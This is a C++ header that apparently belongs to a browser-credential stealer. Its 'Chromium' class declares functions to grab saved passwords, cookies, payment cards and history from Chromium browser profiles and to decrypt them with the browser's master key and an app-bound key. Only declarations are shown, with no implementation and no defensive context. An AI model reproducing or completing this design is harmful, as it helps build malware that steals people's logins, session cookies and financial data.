 
#pragma once
#include <string>
#include <vector>
#include <windows.h>
namespace Modules {
    struct Account {
        std::string URL;
        std::string UserName;
        std::string Password;
        std::string Application;
        std::string Type;  
    };
    struct BrowserPaths {
        std::string name;
        std::string userDataPath;
        bool tryAppBound;  
    };
    class Chromium {
    public:
        static std::vector<Account> Grab();
    private:
        static std::vector<BrowserPaths> GetBrowserList();
        static std::vector<Account> GetPasswords(const BrowserPaths& b, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey);
        static std::vector<Account> GetCookies(const BrowserPaths& b, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey);
        static std::vector<Account> GetCards(const BrowserPaths& b, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey);
        static std::vector<Account> GetHistory(const BrowserPaths& b);
        static std::vector<std::string> GetProfilePaths(const std::string& dataPath, const std::string& file);
        static std::string DecryptValue(const std::string& raw, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey);
        static std::vector<BYTE> GetMasterKey(const std::string& localStateFolder, std::vector<BYTE>& appBoundKeyOut);
        static std::string PathJoin(const std::string& a, const std::string& b);
    };
}
